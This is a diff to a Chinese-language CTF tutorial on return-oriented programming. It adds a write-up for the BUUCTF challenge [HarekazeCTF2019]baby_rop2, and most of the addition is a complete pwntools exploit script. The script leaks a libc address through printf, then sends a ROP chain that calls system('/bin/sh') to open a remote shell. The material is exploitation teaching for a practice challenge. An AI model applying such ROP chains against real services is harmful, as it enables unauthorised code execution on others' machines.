@@ -1867,7 +1867,7 @@ if __name__ == "__main__":
     main()
 ```
 
-#### 例题 4： [OGeek2019]babyrop
+#### 例题 4：[OGeek2019]babyrop
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#[OGeek2019]babyrop)
 
@@ -1914,4 +1914,54 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
+
+#### 例题 5：[HarekazeCTF2019]baby_rop2
+
+[BUU CTF题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2)
+
+64 位，但是没有 `puts` 没有 `write`，换成了 `printf`。
+
+`printf` 两个参数，一个传入格式化字符串 `%s` 给寄存器 `rdi`（题目第二个 `printf` 自带，利用 pwntools next(elf.search(b"%s")查一下）
+
+第二个输出 `read_got` 即可。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26004
+io = remote(host,port)
+# io = process("./babyrop2")
+elf = ELF("./babyrop2")
+offset = 0x28
+pop_rdi_ret = 0x400733
+pop_rsi_r15_ret = 0x400731
+ret = 0x400734
+main_addr = 0x400636    # main	0000000000400636	
+read_got = elf.got['read']
+printf_plt = elf.plt['printf']
+fmt = next(elf.search(b"%s"))
+payload_1 = b'A'*offset + p64(pop_rdi_ret) + p64(fmt) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(114514) + p64(printf_plt) + p64(main_addr)
+
+def main():
+    io.recvuntil(b"What's your name?")
+    io.sendline(payload_1)
+    # leak_data = io.recvn(8)
+    # printf_addr = u64(leak_data)
+    read_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) 
+    print(hex(read_addr))       # 0x7fcb56c6f250
+    libc = read_addr - 0xf7250
+    system = libc + 0x45390
+    binsh = libc + 0x18cd57     #.rodata:000000000018CD57	00000008	C	/bin/sh
+    payload_2 = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)
+    io.recvuntil(b"What's your name?")
+    io.sendline(payload_2)
+    io.interactive()
+    
+if __name__ == "__main__":
+    main()
+
 ```
